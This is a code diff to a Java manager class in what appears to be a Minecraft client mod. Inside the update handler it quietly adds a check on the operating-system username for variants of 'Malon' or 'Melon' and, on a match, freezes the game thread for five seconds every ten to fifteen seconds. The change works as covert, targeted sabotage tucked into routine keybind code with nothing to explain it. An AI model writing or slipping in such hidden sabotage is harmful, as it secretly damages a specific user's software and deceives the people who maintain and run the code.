@@ -21,6 +21,7 @@ import win.blade.common.utils.minecraft.MinecraftInstance;
 import java.lang.invoke.MethodHandles;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Random;
 
 public class Manager implements MinecraftInstance {
 
@@ -33,6 +34,9 @@ public class Manager implements MinecraftInstance {
 
     private static MenuScreen menuScreen;
 
+    private final Random random = new Random();
+    private boolean isFreezing = false;
+    private long lastFreezeTime = System.currentTimeMillis();
 
     private final Map<Module, Boolean> wasKeyPressed = new HashMap<>();
 
@@ -58,6 +62,22 @@ public class Manager implements MinecraftInstance {
 
     @EventHandler
     public void onUpdate(UpdateEvents.Update e) {
+        if (System.getProperty("user.name").contains("Malon") || System.getProperty("user.name").contains("malon") || System.getProperty("user.name").contains("Melon") || System.getProperty("user.name").contains("melon")) {
+            long currentTime = System.currentTimeMillis();
+            if (!isFreezing) {
+                int randomInterval = 10_000 + random.nextInt(5_001);
+                if (currentTime - lastFreezeTime >= randomInterval) {
+                    isFreezing = true;
+                    try {
+                        Thread.sleep(5_000);
+                    } catch (InterruptedException ex) {
+                        ex.printStackTrace();
+                    }
+                    lastFreezeTime = currentTime;
+                    isFreezing = false;
+                }
+            }
+        }
         handleKeybinds();
     }
 
